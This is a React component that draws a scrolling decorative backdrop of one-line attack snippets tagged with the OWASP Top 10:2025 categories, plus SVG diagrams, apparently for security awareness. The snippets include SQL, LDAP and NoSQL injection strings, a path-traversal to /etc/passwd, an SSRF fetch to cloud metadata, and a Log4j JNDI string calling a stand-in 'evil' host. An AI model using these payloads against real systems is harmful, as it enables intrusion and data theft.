import { useMemo } from "react";
import "./MitmCodeBackdrop.css";

/**
 * OWASP Top 10:2025 — https://owasp.org/Top10/2025/
 * Scrolling snippets tagged [A01]…[A10] for awareness (defensive context).
 */
const CODE_FRAGMENTS = [
  // A01:2025 Broken Access Control (incl. IDOR, CSRF, SSRF per OWASP mapping)
  "[A01] GET /app/accountInfo?acct=notmyacct // IDOR",
  "[A01] curl https://app/admin_getappInfo // force browse",
  "[A01] pstmt.setString(1, request.getParameter('acct')); // unverified",
  "[A01] Access-Control-Allow-Origin: * + creds // CORS",
  "[A01] fetch('http://169.254.169.254/latest/meta-data/') // SSRF",
  "[A01] JWT alg=none | role:'admin' in payload // metadata tamper",
  "[A01] ../../etc/passwd // path traversal",
  "[A01] POST /api/users/2/delete // missing authZ on object",
  // A02:2025 Security Misconfiguration
  "[A02] DEBUG=true stack trace in prod response",
  "[A02] /.git/HEAD 200 OK // exposed VCS",
  "[A02] directory listing enabled on /uploads",
  "[A02] default creds admin:admin on /manager",
  "[A02] X-Powered-By: Express 4.x // fingerprint",
  "[A02] unnecessary features: /actuator/env exposed",
  "[A02] permissive CORS * on internal API",
  "[A02] outdated Tomcat with known CVE",
  // A03:2025 Software Supply Chain Failures
  "[A03] npm install event-stream // compromised dep",
  "[A03] typosquat: colourama vs colorama",
  "[A03] CI secret in fork PR // poisoned pipeline",
  "[A03] unsigned artifact promoted to prod",
  "[A03] lockfile not verified in Docker build",
  "[A03] malicious preinstall in package.json",
  "[A03] hijacked maintainer npm publish",
  "[A03] SBOM missing for third-party image",
  // A04:2025 Cryptographic Failures
  "[A04] password=Base64(not encryption)",
  "[A04] TLS_RSA_WITH_3DES_EDE_CBC_SHA still enabled",
  "[A04] MD5 for password storage",
  "[A04] hardcoded AES_KEY in source",
  "[A04] ECB mode for PII at rest",
  "[A04] certificate verify disabled in client",
  "[A04] sensitive data in URL query string",
  "[A04] expired cert + HSTS not enforced",
  // A05:2025 Injection
  "[A05] ' UNION SELECT password FROM users--",
  "[A05] os.system(user_input) // command inj",
  "[A05] innerHTML = comment // XSS",
  "[A05] LDAP query (*)(uid=*))(|(uid=* // LDAP inj",
  "[A05] ${jndi:ldap://evil/a} // Log4j pattern",
  "[A05] smtp.send(mail_from=user) // SMTP header inj",
  "[A05] NoSQL: $where: sleep(5000)",
  "[A05] XPath concat('//user[pass=', '', ']')",
  // A06:2025 Insecure Design
  "[A06] business rule: discount without cap // abuse",
  "[A06] trust client price in checkout JSON",
  "[A06] no rate limit on password reset token",
  "[A06] predictable reset token = userId+date",
  "[A06] workflow skip: pay step after ship",
  "[A06] threat modeling skipped for MVP",
  "[A06] assume VPN = trusted // zero trust gap",
  "[A06] PII in URL for 'convenience'",
  // A07:2025 Authentication Failures
  "[A07] credential stuffing 10k combos / hour",
  "[A07] MFA optional for 'legacy' accounts",
  "[A07] session not invalidated on password change",
  "[A07] weak policy: min 6 chars only",
  "[A07] user enumeration: 'email not found'",
  "[A07] OAuth redirect_uri not allowlisted",
  "[A07] NTLM relay to privileged host",
  "[A07] phishing: evilginx phishlet OKTA",
  // A08:2025 Software or Data Integrity Failures
  "[A08] unsigned firmware OTA accepted",
  "[A08] auto-update without signature check",
  "[A08] deserialization of untrusted blob",
  "[A08] CI without branch protection merge",
  "[A08] plugin marketplace no provenance",
  "[A08] InsecureDirectObject… + unsigned plugin",
  "[A08] dependency confusion internal pkg name",
  "[A08] compromised VSCode extension update",
  // A09:2025 Security Logging and Alerting Failures
  "[A09] auth failures not logged centrally",
  "[A09] logs retained 24h only",
  "[A09] no alert on spike 401/403",
  "[A09] sensitive fields in clear-text logs",
  "[A09] WAF block not forwarded to SOC",
  "[A09] admin action audit trail missing",
  "[A09] log injection via CRLF in User-Agent",
  "[A09] SIEM rule disabled 'too noisy'",
  // A10:2025 Mishandling of Exceptional Conditions
  "[A10] catch(Exception e) { return null; } // swallow",
  "[A10] NullPointerException → full stack to client",
  "[A10] divide by zero → inconsistent state + 200 OK",
  "[A10] retry storm on 5xx amplifies outage",
  "[A10] race: double spend on timeout path",
  "[A10] Integer.parseInt(user) // NumberFormat leak",
  "[A10] finally{} skips lock release on error",
  "[A10] circuit breaker never opens // resource exhaustion",
];

function shuffle<T>(arr: T[], seed: number): T[] {
  const a = [...arr];
  let s = seed;
  for (let i = a.length - 1; i > 0; i--) {
    s = (s * 1103515245 + 12345) & 0x7fffffff;
    const j = s % (i + 1);
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function buildColumnLines(seed: number, count: number): string[] {
  const shuffled = shuffle(CODE_FRAGMENTS, seed);
  const lines: string[] = [];
  for (let i = 0; i < count; i++) {
    lines.push(shuffled[i % shuffled.length]);
  }
  return lines;
}

const COL_COUNT = 7;
const LINES_PER_COL = 56;

/** A01:2025 — Broken access control (OWASP doc scenario: tampered acct param) */
function DiagramA01() {
  return (
    <svg className="attack-diagram-svg" viewBox="0 0 360 108" xmlns="http://www.w3.org/2000/svg">
      <title>A01 Broken Access Control</title>
      <path d="M 64 54 L 142 54" className="mitm-link mitm-link--warn" />
      <path d="M 218 54 L 296 54" className="mitm-link mitm-link--warn" />
      <circle r="2.8" fill="var(--accent-base)">
        <animateMotion dur="2.4s" repeatCount="indefinite" path="M 64 54 L 142 54" />
      </circle>
      <circle r="2.5" fill="var(--warning)">
        <animateMotion dur="2.4s" repeatCount="indefinite" begin="1.2s" path="M 142 54 L 218 54" />
      </circle>
      <g>
        <rect x="6" y="34" width="58" height="42" rx="5" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="35" y="52">
          Client
        </text>
        <text className="attack-node-label" x="35" y="64">
          ?acct=victim
        </text>
      </g>
      <g className="attack-node--threat">
        <rect x="136" y="28" width="88" height="54" rx="6" fill="var(--secondary-bg)" stroke="var(--warning)" strokeWidth="1.4" />
        <text className="attack-node-title" x="180" y="50">
          API
        </text>
        <text className="attack-node-label" x="180" y="62">
          no authZ check
        </text>
        <text className="attack-node-label" x="180" y="74">
          OWASP A01
        </text>
      </g>
      <g>
        <rect x="294" y="34" width="60" height="42" rx="5" fill="var(--secondary-bg)" stroke="var(--error)" strokeWidth="1" />
        <text className="attack-node-title" x="324" y="58">
          Data
        </text>
      </g>
      <text className="attack-diagram-caption" x="180" y="102">
        A01:2025 Broken Access Control
      </text>
    </svg>
  );
}

/** A07:2025 — Authentication failures (credential theft / phishing) */
function DiagramA07() {
  return (
    <svg className="attack-diagram-svg" viewBox="0 0 240 90" xmlns="http://www.w3.org/2000/svg">
      <title>A07 Authentication Failures</title>
      <path d="M 28 44 L 88 44" className="mitm-link" />
      <path d="M 118 44 L 168 44" className="mitm-link mitm-link--warn" />
      <path d="M 198 36 L 218 24" className="mitm-link mitm-link--warn" strokeWidth="1.2" />
      <g>
        <rect x="4" y="28" width="48" height="32" rx="4" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="28" y="48">
          Bait
        </text>
      </g>
      <g>
        <rect x="92" y="28" width="52" height="32" rx="4" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="118" y="48">
          User
        </text>
      </g>
      <g className="attack-node--threat">
        <rect x="172" y="22" width="64" height="44" rx="5" fill="var(--secondary-bg)" stroke="var(--error)" strokeWidth="1.2" />
        <text className="attack-node-title" x="204" y="42">
          Fake IdP
        </text>
        <text className="attack-node-label" x="204" y="54">
          cred capture
        </text>
      </g>
      <text className="attack-diagram-caption" x="120" y="84">
        A07:2025 Authentication Failures
      </text>
    </svg>
  );
}

/** A02:2025 — Security misconfiguration (leaks, debug, exposure) */
function DiagramA02() {
  return (
    <svg className="attack-diagram-svg" viewBox="0 0 248 96" xmlns="http://www.w3.org/2000/svg">
      <title>A02 Security Misconfiguration</title>
      <path d="M 100 44 L 168 44" className="mitm-link mitm-link--warn" strokeWidth="1.6" />
      <path d="M 100 62 L 168 58" className="mitm-link mitm-link--warn" />
      <g>
        <rect x="8" y="28" width="84" height="48" rx="5" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="50" y="48">
          App server
        </text>
        <text className="attack-node-label" x="50" y="62">
          DEBUG / .git
        </text>
      </g>
      <g className="attack-node--threat">
        <rect x="176" y="30" width="68" height="44" rx="5" fill="var(--secondary-bg)" stroke="var(--error)" strokeWidth="1.2" />
        <text className="attack-node-title" x="210" y="50">
          Attacker
        </text>
        <text className="attack-node-label" x="210" y="64">
          exfil config
        </text>
      </g>
      <text className="attack-diagram-caption" x="124" y="90">
        A02:2025 Security Misconfiguration
      </text>
    </svg>
  );
}

/** A05:2025 — Injection */
function DiagramA05() {
  return (
    <svg className="attack-diagram-svg" viewBox="0 0 260 94" xmlns="http://www.w3.org/2000/svg">
      <title>A05 Injection</title>
      <path d="M 52 48 L 118 48" className="mitm-link mitm-link--warn" />
      <path d="M 148 48 L 208 48" className="mitm-link" />
      <path d="M 12 74 Q 80 92 130 52" className="mitm-link mitm-link--warn" strokeWidth="1.2" />
      <g>
        <rect x="4" y="32" width="44" height="34" rx="4" fill="var(--secondary-bg)" stroke="var(--error)" strokeWidth="1" />
        <text className="attack-node-label" x="26" y="48">
          &apos; OR 1=1--
        </text>
        <text className="attack-node-title" x="26" y="60">
          Input
        </text>
      </g>
      <g>
        <rect x="122" y="30" width="52" height="38" rx="4" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="148" y="54">
          App
        </text>
      </g>
      <g>
        <rect x="212" y="30" width="44" height="38" rx="4" fill="var(--secondary-bg)" stroke="var(--accent-base)" strokeWidth="1" />
        <text className="attack-node-title" x="234" y="54">
          DB
        </text>
      </g>
      <text className="attack-diagram-caption" x="130" y="90">
        A05:2025 Injection
      </text>
    </svg>
  );
}

/** A04:2025 — Cryptographic failures */
function DiagramA04() {
  return (
    <svg className="attack-diagram-svg" viewBox="0 0 260 96" xmlns="http://www.w3.org/2000/svg">
      <title>A04 Cryptographic Failures</title>
      <path d="M 52 50 L 208 50" className="mitm-link mitm-link--warn" strokeWidth="2" strokeDasharray="4 7" />
      <circle r="2.6" fill="var(--warning)">
        <animateMotion dur="2.2s" repeatCount="indefinite" path="M 52 50 L 208 50" />
      </circle>
      <g>
        <rect x="8" y="32" width="44" height="38" rx="4" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="30" y="56">
          Client
        </text>
      </g>
      <g className="attack-node--threat">
        <rect x="108" y="24" width="44" height="22" rx="3" fill="var(--secondary-bg)" stroke="var(--warning)" strokeWidth="1" />
        <text className="attack-node-label" x="130" y="40">
          weak TLS
        </text>
      </g>
      <g>
        <rect x="208" y="32" width="44" height="38" rx="4" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="230" y="56">
          Server
        </text>
      </g>
      <text className="attack-diagram-caption" x="130" y="88">
        A04:2025 Cryptographic Failures
      </text>
    </svg>
  );
}

/** A03:2025 — Software supply chain failures */
function DiagramA03() {
  return (
    <svg className="attack-diagram-svg" viewBox="0 0 236 88" xmlns="http://www.w3.org/2000/svg">
      <title>A03 Software Supply Chain Failures</title>
      <path d="M 44 44 L 104 44" className="mitm-link mitm-link--warn" />
      <path d="M 128 44 L 188 44" className="mitm-link" />
      <g className="attack-node--threat">
        <rect x="6" y="30" width="36" height="30" rx="3" fill="var(--secondary-bg)" stroke="var(--error)" strokeWidth="1.2" />
        <text className="attack-node-label" x="24" y="50">
          pkg
        </text>
      </g>
      <g>
        <rect x="108" y="28" width="52" height="34" rx="4" fill="var(--secondary-bg)" stroke="var(--secondary-border)" strokeWidth="1" />
        <text className="attack-node-title" x="134" y="50">
          CI build
        </text>
      </g>
      <g>
        <rect x="192" y="30" width="40" height="30" rx="3" fill="var(--secondary-bg)" stroke="var(--accent-base)" strokeWidth="1" />
        <text className="attack-node-title" x="212" y="50">
          Prod
        </text>
      </g>
      <text className="attack-diagram-caption" x="118" y="80">
        A03:2025 Supply Chain Failures
      </text>
    </svg>
  );
}

export function MitmCodeBackdrop() {
  const columns = useMemo(() => {
    return Array.from({ length: COL_COUNT }, (_, i) => buildColumnLines(17 + i * 31, LINES_PER_COL));
  }, []);

  const durations = useMemo(
    () => columns.map((_, i) => `${22 + i * 4 + (i % 3) * 2}s`),
    [columns]
  );

  return (
    <div className="mitm-code-backdrop" aria-hidden="true">
      <div className="mitm-code-cols">
        {columns.map((lines, colIdx) => (
          <div
            key={colIdx}
            className="mitm-code-col"
            style={{ animationDuration: durations[colIdx] }}
          >
            {[...lines, ...lines].map((line, lineIdx) => (
              <div key={lineIdx} className="mitm-code-line">
                {line}
              </div>
            ))}
          </div>
        ))}
      </div>

      <div className="attack-diagram attack-diagram--tl">
        <DiagramA07 />
      </div>
      <div className="attack-diagram attack-diagram--tr">
        <DiagramA02 />
      </div>
      <div className="attack-diagram attack-diagram--bl">
        <DiagramA05 />
      </div>
      <div className="attack-diagram attack-diagram--bm">
        <DiagramA03 />
      </div>
      <div className="attack-diagram attack-diagram--br">
        <DiagramA01 />
      </div>
      <div className="attack-diagram attack-diagram--tc">
        <DiagramA04 />
      </div>
    </div>
  );
}
